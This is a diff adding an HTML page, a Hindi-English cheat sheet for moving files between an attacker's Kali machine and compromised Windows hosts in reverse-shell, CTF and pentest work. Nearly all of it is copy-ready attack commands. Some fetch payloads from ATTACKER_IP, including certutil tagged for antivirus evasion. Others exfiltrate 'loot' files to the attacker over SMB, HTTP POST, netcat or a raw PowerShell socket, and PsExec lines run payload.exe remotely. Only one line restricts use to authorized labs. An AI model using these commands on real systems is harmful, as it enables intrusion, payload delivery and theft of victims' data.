@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Windows ⇄ Kali File Transfer Cheat Sheet</title>
+<style>
+  :root {
+    --bg: #0f1115;
+    --surface: #171a21;
+    --surface2: #1e222b;
+    --border: #2a2f3a;
+    --text: #e6e8ec;
+    --muted: #9aa3b2;
+    --accent: #5ee6a8;
+    --accent2: #7aa2ff;
+    --code-bg: #0b0d12;
+    --danger: #ff8a8a;
+    color-scheme: dark;
+    box-sizing: border-box;
+    padding-top: env(safe-area-inset-top, 0px);
+    padding-bottom: env(safe-area-inset-bottom, 0px);
+  }
+  @media (prefers-color-scheme: light) {
+    :root:not([data-theme="dark"]) {
+      --bg: #f5f6f8;
+      --surface: #ffffff;
+      --surface2: #f0f1f4;
+      --border: #dde1e7;
+      --text: #1b1f27;
+      --muted: #5b6372;
+      --accent: #0b8f5a;
+      --accent2: #2a5fd6;
+      --code-bg: #0f1115;
+      --danger: #c0392b;
+      color-scheme: light;
+    }
+  }
+  :root[data-theme="dark"] {
+    --bg: #0f1115; --surface:#171a21; --surface2:#1e222b; --border:#2a2f3a;
+    --text:#e6e8ec; --muted:#9aa3b2; --accent:#5ee6a8; --accent2:#7aa2ff;
+    --code-bg:#0b0d12; --danger:#ff8a8a; color-scheme: dark;
+  }
+  html { scroll-padding-top: env(safe-area-inset-top, 0px); }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: "Segoe UI", system-ui, -apple-system, Roboto, sans-serif;
+    line-height: 1.5;
+  }
+  body::before {
+    content: ""; position: fixed; inset: 0 0 auto; z-index: 10;
+    height: env(safe-area-inset-top, 0px); background: var(--bg);
+  }
+  header {
+    position: sticky; top: env(safe-area-inset-top, 0px); z-index: 5;
+    background: var(--surface); border-bottom: 1px solid var(--border);
+    padding: 18px 20px;
+  }
+  header h1 { margin: 0; font-size: 1.25rem; }
+  header p { margin: 4px 0 0; color: var(--muted); font-size: 0.9rem; }
+  .wrap { max-width: 980px; margin: 0 auto; padding: 24px 16px 60px; }
+  .dir-toggle {
+    display: flex; gap: 8px; margin-bottom: 24px; flex-wrap: wrap;
+  }
+  .dir-toggle button {
+    background: var(--surface2); color: var(--text); border: 1px solid var(--border);
+    padding: 8px 16px; border-radius: 999px; cursor: pointer; font-size: 0.85rem;
+  }
+  .dir-toggle button.active { background: var(--accent); color: #06130d; border-color: var(--accent); font-weight: 600; }
+  section.panel { display: none; }
+  section.panel.active { display: block; }
+  .card {
+    background: var(--surface); border: 1px solid var(--border); border-radius: 12px;
+    padding: 16px 18px; margin-bottom: 14px;
+  }
+  .card h3 { margin: 0 0 6px; font-size: 1rem; color: var(--accent2); }
+  .card .note { color: var(--muted); font-size: 0.85rem; margin-bottom: 8px; }
+  .codebox {
+    position: relative; background: var(--code-bg); border-radius: 8px;
+    overflow-x: auto; margin-top: 6px;
+  }
+  .codebox pre { margin: 0; padding: 12px 44px 12px 14px; font-size: 0.85rem; color: #d7ffe9; white-space: pre; }
+  .copy-btn {
+    position: absolute; top: 8px; right: 8px; background: var(--surface2); color: var(--text);
+    border: 1px solid var(--border); border-radius: 6px; font-size: 0.7rem; padding: 4px 8px; cursor: pointer;
+  }
+  .copy-btn:active { background: var(--accent); color: #06130d; }
+  table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 0.85rem; }
+  th, td { text-align: left; padding: 8px 10px; border-bottom: 1px solid var(--border); }
+  th { color: var(--muted); font-weight: 600; }
+  .tag { display:inline-block; background: var(--surface2); border:1px solid var(--border); border-radius:6px; padding:1px 7px; font-size:0.72rem; color: var(--accent); margin-left:6px; }
+  .warn { color: var(--danger); font-size: 0.8rem; margin-top: 10px; }
+  h2.section-title { font-size: 1.05rem; margin: 26px 0 10px; color: var(--text); border-left: 3px solid var(--accent); padding-left: 10px; }
+</style>
+</head>
+<body>
+<header>
+  <h1>🪟 ⇄ 🐉 Windows / Kali File Transfer Cheat Sheet</h1>
+  <p>Reverse shell • CTF • Evil-WinRM • PsExec — sab methods ek jagah</p>
+</header>
+<div class="wrap">
+
+  <div class="dir-toggle">
+    <button class="active" data-target="dl">⬇️ Kali → Windows (Download)</button>
+    <button data-target="ul">⬆️ Windows → Kali (Upload / Exfil)</button>
+    <button data-target="misc">🔧 Evil-WinRM / PsExec</button>
+  </div>
+
+  <!-- DOWNLOAD -->
+  <section class="panel active" id="dl">
+    <h2 class="section-title">Step 1 — Kali pe server start karo</h2>
+    <div class="card">
+      <h3>HTTP server <span class="tag">most common</span></h3>
+      <div class="codebox"><pre id="c1">python3 -m http.server 80</pre><button class="copy-btn" data-copy="c1">Copy</button></div>
+    </div>
+    <div class="card">
+      <h3>SMB server (Impacket)</h3>
+      <div class="codebox"><pre id="c2">impacket-smbserver share $(pwd) -smb2support</pre><button class="copy-btn" data-copy="c2">Copy</button></div>
+    </div>
+
+    <h2 class="section-title">Step 2 — Windows shell se download</h2>
+    <div class="card">
+      <h3>PowerShell — Invoke-WebRequest</h3>
+      <div class="codebox"><pre id="c3">powershell -c "Invoke-WebRequest -Uri http://ATTACKER_IP/file.exe -OutFile C:\Windows\Temp\file.exe"</pre><button class="copy-btn" data-copy="c3">Copy</button></div>
+    </div>
+    <div class="card">
+      <h3>PowerShell — Net.WebClient (legacy)</h3>
+      <div class="codebox"><pre id="c4">powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/file.exe','C:\Windows\Temp\file.exe')"</pre><button class="copy-btn" data-copy="c4">Copy</button></div>
+    </div>
+    <div class="card">
+      <h3>certutil <span class="tag">LOLBin / AV evasion</span></h3>
+      <div class="codebox"><pre id="c5">certutil -urlcache -split -f http://ATTACKER_IP/file.exe file.exe</pre><button class="copy-btn" data-copy="c5">Copy</button></div>
+    </div>
+    <div class="card">
+      <h3>bitsadmin</h3>
+      <div class="codebox"><pre id="c6">bitsadmin /transfer job /download /priority high http://ATTACKER_IP/file.exe C:\Windows\Temp\file.exe</pre><button class="copy-btn" data-copy="c6">Copy</button></div>
+    </div>
+    <div class="card">
+      <h3>curl.exe <span class="tag">Win10+ built-in</span></h3>
+      <div class="codebox"><pre id="c7">curl.exe http://ATTACKER_IP/file.exe -o file.exe</pre><button class="copy-btn" data-copy="c7">Copy</button></div>
+    </div>
+    <div class="card">
+      <h3>SMB copy</h3>
+      <div class="codebox"><pre id="c8">copy \\ATTACKER_IP\share\file.exe C:\Windows\Temp\file.exe</pre><button class="copy-btn" data-copy="c8">Copy</button></div>
+    </div>
+    <div class="card">
+      <h3>TFTP</h3>
+      <div class="codebox"><pre id="c9">tftp -i ATTACKER_IP GET file.exe</pre><button class="copy-btn" data-copy="c9">Copy</button></div>
+    </div>
+  </section>
+
+  <!-- UPLOAD -->
+  <section class="panel" id="ul">
+    <h2 class="section-title">Step 1 — Kali pe receiver taiyar karo</h2>
+    <div class="card">
+      <h3>SMB server <span class="tag">sabse aasan</span></h3>
+      <div class="codebox"><pre id="u1">impacket-smbserver share $(pwd) -smb2support -username test -password test</pre><button class="copy-btn" data-copy="u1">Copy</button></div>
+    </div>
+    <div class="card">
+      <h3>uploadserver (HTTP POST receive)</h3>
+      <div class="codebox"><pre id="u2">pip3 install uploadserver
+python3 -m uploadserver 8000</pre><button class="copy-btn" data-copy="u2">Copy</button></div>
+    </div>
+    <div class="card">
+      <h3>Netcat listener</h3>
+      <div class="codebox"><pre id="u3">nc -lvnp 4444 > received_file.txt</pre><button class="copy-btn" data-copy="u3">Copy</button></div>
+    </div>
+
+    <h2 class="section-title">Step 2 — Windows se bhejo (Kali ko)</h2>
+    <div class="card">
+      <h3>SMB copy</h3>
+      <div class="codebox"><pre id="u4">net use \\KALI_IP\share /user:test test
+copy C:\loot.txt \\KALI_IP\share\loot.txt</pre><button class="copy-btn" data-copy="u4">Copy</button></div>
+    </div>
+    <div class="card">
+      <h3>PowerShell upload (uploadserver ke sath)</h3>
+      <div class="codebox"><pre id="u5">powershell -c "Invoke-WebRequest -Uri http://KALI_IP:8000/upload -Method POST -InFile C:\loot.txt"</pre><button class="copy-btn" data-copy="u5">Copy</button></div>
+    </div>
+    <div class="card">
+      <h3>Netcat (agar nc.exe victim pe ho)</h3>
+      <div class="codebox"><pre id="u6">nc KALI_IP 4444 < C:\loot.txt</pre><button class="copy-btn" data-copy="u6">Copy</button></div>
+    </div>
+    <div class="card">
+      <h3>PowerShell raw TCP socket (nc na ho to)</h3>
+      <div class="codebox"><pre id="u7">$c=New-Object System.Net.Sockets.TCPClient("KALI_IP",4444)
+$s=$c.GetStream()
+$b=[IO.File]::ReadAllBytes("C:\loot.txt")
+$s.Write($b,0,$b.Length); $s.Close(); $c.Close()</pre><button class="copy-btn" data-copy="u7">Copy</button></div>
+    </div>
+    <div class="card">
+      <h3>Base64 copy-paste <span class="tag">jab sab firewall block ho</span></h3>
+      <div class="codebox"><pre id="u8">[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\loot.txt")) | Out-File b64.txt
+type b64.txt</pre><button class="copy-btn" data-copy="u8">Copy</button></div>
+      <div class="note">Kali pe decode: <code>echo "BASE64" | base64 -d > loot.txt</code></div>
+    </div>
+  </section>
+
+  <!-- MISC -->
+  <section class="panel" id="misc">
+    <h2 class="section-title">Evil-WinRM built-in</h2>
+    <div class="card">
+      <h3>Upload / Download</h3>
+      <div class="codebox"><pre id="m1">upload /local/path/file.exe C:\Windows\Temp\file.exe
+download C:\Windows\Temp\loot.txt /local/path/loot.txt</pre><button class="copy-btn" data-copy="m1">Copy</button></div>
+      <div class="note">Native feature — alag server ki zaroorat nahi.</div>
+    </div>
+
+    <h2 class="section-title">PsExec / Impacket</h2>
+    <div class="card">
+      <h3>Sysinternals PsExec (copy + run)</h3>
+      <div class="codebox"><pre id="m2">psexec.exe \\TARGET -u user -p pass -c payload.exe</pre><button class="copy-btn" data-copy="m2">Copy</button></div>
+      <div class="note"><code>-c</code> flag local binary ko ADMIN$ share ke through copy karke run karta hai.</div>
+    </div>
+    <div class="card">
+      <h3>Impacket psexec.py</h3>
+      <div class="codebox"><pre id="m3">impacket-psexec user:pass@TARGET_IP</pre><button class="copy-btn" data-copy="m3">Copy</button></div>
+    </div>
+    <div class="card">
+      <h3>Impacket smbclient (file-only, no execution)</h3>
+      <div class="codebox"><pre id="m4">impacket-smbclient user:pass@TARGET_IP
+> put file.exe
+> get loot.txt</pre><button class="copy-btn" data-copy="m4">Copy</button></div>
+    </div>
+
+    <h2 class="section-title">Quick decision table</h2>
+    <table>
+      <tr><th>Situation</th><th>Best method</th></tr>
+      <tr><td>Modern Windows, outbound open</td><td>curl.exe / iwr</td></tr>
+      <tr><td>AV evasion zaroori</td><td>certutil (LOLBin)</td></tr>
+      <tr><td>Proxy/firewall restricted</td><td>bitsadmin / certreq</td></tr>
+      <tr><td>Sirf command exec, no interactive</td><td>Base64 chunks</td></tr>
+      <tr><td>Creds + Evil-WinRM session</td><td>upload / download</td></tr>
+      <tr><td>Lateral movement + execution</td><td>PsExec / Impacket</td></tr>
+      <tr><td>Sirf files, execution nahi</td><td>Impacket smbclient</td></tr>
+    </table>
+    <div class="warn">⚠️ Sirf authorized CTF / lab / pentest environments ke liye. Bina permission kisi system pe use mat karo.</div>
+  </section>
+
+</div>
+
+<script>
+  document.querySelectorAll('.dir-toggle button').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.querySelectorAll('.dir-toggle button').forEach(b => b.classList.remove('active'));
+      document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+      btn.classList.add('active');
+      document.getElementById(btn.dataset.target).classList.add('active');
+    });
+  });
+  document.querySelectorAll('.copy-btn').forEach(btn => {
+    btn.addEventListener('click', async () => {
+      const text = document.getElementById(btn.dataset.copy).innerText;
+      try {
+        await navigator.clipboard.writeText(text);
+        const orig = btn.textContent;
+        btn.textContent = 'Copied!';
+        setTimeout(() => btn.textContent = orig, 1200);
+      } catch (e) {
+        btn.textContent = 'Error';
+      }
+    });
+  });
+</script>
+</body>
+</html>
